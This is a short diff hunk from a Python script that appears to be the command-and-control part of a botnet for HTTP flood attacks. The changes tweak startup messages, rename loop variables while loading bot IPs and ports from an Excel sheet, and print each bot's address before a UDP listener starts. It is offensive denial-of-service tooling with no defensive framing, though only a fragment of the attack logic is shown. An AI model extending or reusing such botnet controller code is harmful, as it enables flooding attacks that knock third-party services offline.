@@ -73,14 +73,14 @@ if __name__ == "__main__":
     print ("+--------------------------+")
     print ()
     print ("Port: %s" % port)
-    print ("Botnet: %s" % botnet_path)
-    print ()
-    print ("HTTP flood attack will begin in")
+    print ("Botnet: bots stored in %s" % botnet_path)
     sheet = pandas.read_excel(botnet_path, sheetname='Sheet1')
     botnet = {'ip': [], 'port': []}
-    for ip, port in zip(sheet['ip'], sheet['port']):
-        botnet['ip'].append(ip)
-        botnet['port'].append(port)
+    for _ip, _port in zip(sheet['ip'], sheet['port']):
+        botnet['ip'].append(_ip)
+        botnet['port'].append(_port)
+        print ("  "+botnet['ip'][-1]+":"+str(botnet['port'][-1]))
+    print ()
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.bind(('0.0.0.0', port))
     while True:
